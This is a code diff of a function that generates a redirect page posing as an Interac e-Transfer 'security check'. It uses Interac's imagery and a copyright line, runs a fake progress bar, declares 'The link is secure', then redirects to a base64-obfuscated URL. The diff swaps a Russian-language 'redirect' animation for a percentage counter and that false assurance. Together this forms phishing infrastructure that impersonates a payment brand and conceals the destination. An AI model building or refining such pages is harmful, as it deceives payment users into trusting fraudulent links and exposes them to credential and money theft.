@@ -79,104 +79,102 @@ function createRedirectPage(targetURL) {
       <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security check</title>
-    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'nonce-unique123'; style-src 'self' 'nonce-unique123'; img-src 'self' https://www.interac.ca data:;">
-    <meta name="referrer" content="no-referrer">
-    <meta name="permissions-policy" content="fullscreen=(), geolocation=()">
-    <meta name="author" content="Dino">
-    <meta name="description" content="Secure URL shortening service">
-    <style nonce="unique123">
-        body {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            margin: 0;
-            font-family: Arial, sans-serif;
-            background-color: #f9f9f9;
-        }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Security check</title>
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'nonce-unique123'; style-src 'self' 'nonce-unique123'; img-src 'self' https://www.interac.ca data:;">
+<meta name="referrer" content="no-referrer">
+<meta name="permissions-policy" content="fullscreen=(), geolocation=()">
+<meta name="author" content="Dino">
+<meta name="description" content="Secure URL shortening service">
+<style nonce="unique123">
+body {
+display: flex;
+flex-direction: column;
+align-items: center;
+justify-content: center;
+margin: 0;
+font-family: Arial, sans-serif;
+background-color: #f9f9f9;
+}
 
-        img {
-            max-width: 45%;
-            height: auto;
-        }
+img {
+max-width: 45%;
+height: auto;
+}
 
-        .progress {
-            margin-top: 20px;
-            width: 70%;
-            max-width: 350px;
-            height: 20px;
-            max-height: 20px;
-            background-color: #e0e0e0;
-            border-radius: 10px;
-            overflow: hidden;
-        }
+.progress {
+margin-top: 20px;
+width: 70%;
+max-width: 350px;
+height: 20px;
+max-height: 20px;
+background-color: #e0e0e0;
+border-radius: 10px;
+overflow: hidden;
+}
 
-        .progress-bar {
-            height: 100%;
-            width: 100%;
-            background-color: #fcd116;
-            transition: width 0.5s;
-        }
+.progress-bar {
+height: 100%;
+width: 100%;
+background-color: #fcd116;
+transition: width 0.5s;
+}
 
-        .redirect-message {
-            margin-top: 18px;
-            font-size: 22px;
-        }
+.percentage {
+margin-top: 18px;
+font-size: 22px;
+}
 
-        .circle {
-            display: inline-flex;
-            justify-content: center;
-            align-items: center;
-            width: 15px;
-            height: 15px;
-            border-radius: 50%;
-            background-color: #f0f0f0;
-            border: 1px solid #ccc;
-            font-size: 24px;
-            font-weight: bold;
-            color: #333;
-        }
-    </style>
+.circle {
+display: inline-flex;
+justify-content: center;
+align-items: center;
+width: 15px;
+height: 15px;
+border-radius: 50%;
+background-color: #f0f0f0;
+border: 1px solid #ccc;
+font-size: 24px;
+font-weight: bold;
+color: #333;
+}
+</style>
 </head>
 <body>
-    <img src="https://www.interac.ca/wp-content/uploads/2021/05/TrueFalse_GIF_05-4.gif" alt="Loading">
-    <h4>Ensuring a safe <div class="circle">e</div>-Transfer environment</h4>
-    <div class="progress">
-        <div class="progress-bar" id="progress-bar"></div>
-    </div>
-    <div class="redirect-message" id="redirect-message">Редирект</div>
-    <p>&copy; e-Transfer 2000-2025. All rights reserved.</p>
-    <p>Security check of the link. 🔒</p>
+<img src="https://www.interac.ca/wp-content/uploads/2021/05/TrueFalse_GIF_05-4.gif" alt="Loading">
+<h4>Ensuring a safe <div class="circle">e</div>-Transfer environment</h4>
+<div class="progress">
+<div class="progress-bar" id="progress-bar"></div>
+</div>
+<div class="percentage" id="percentage">0%</div>
+<p>&copy; e-Transfer 2000-2025. All rights reserved.</p>
+<p>Security check of the link. 🔒</p>
 
-    <script nonce="unique123" type="text/javascript">
-        const progressBar = document.getElementById('progress-bar');
-        const redirectMessage = document.getElementById('redirect-message');
-        let dots = '';
-        let intervalId;
+<script nonce="unique123" type="text/javascript">
+const progressBar = document.getElementById('progress-bar');
+const percentage = document.getElementById('percentage');
+const progressContainer = document.querySelector('.progress');
+let progress = 0;
+const interval = setInterval(() => {
+progress += 10;
+progressBar.style.width = progress + '%';
+percentage.textContent = progress + '%';
+if (progress >= 100) {
+clearInterval(interval);
 
-        // Функция для обновления сообщения с точками
-        function updateRedirectMessage() {
-            if (dots.length < 3) {
-                dots += '.';
-            } else {
-                dots = ''; // Сброс точек после трех
-            }
-            redirectMessage.textContent = `Редирект${dots}`;
-        }
+setTimeout(() => {
+progressContainer.style.display = 'none';
+percentage.innerHTML = '<b>The link is secure</b>';
 
-        // Запускаем анимацию точек каждую секунду
-        intervalId = setInterval(updateRedirectMessage, 1000);
-
-        // Через 5 секунд останавливаем анимацию и выполняем редирект
-        setTimeout(() => {
-            clearInterval(intervalId); // Останавливаем анимацию точек
-            const url = atob('${encodedURL}'); // Декодируем URL
-            window.location.href = url; // Редирект на целевую страницу
-        }, 5000); // 5000 миллисекунд = 5 секунд
-    </script>
+setTimeout(() => {
+const url = atob('${encodedURL}');
+window.location.href = url;
+}, 1000);
+}, 500);
+}
+}, 600);
+</script>
 </body>
 </html>
     `;
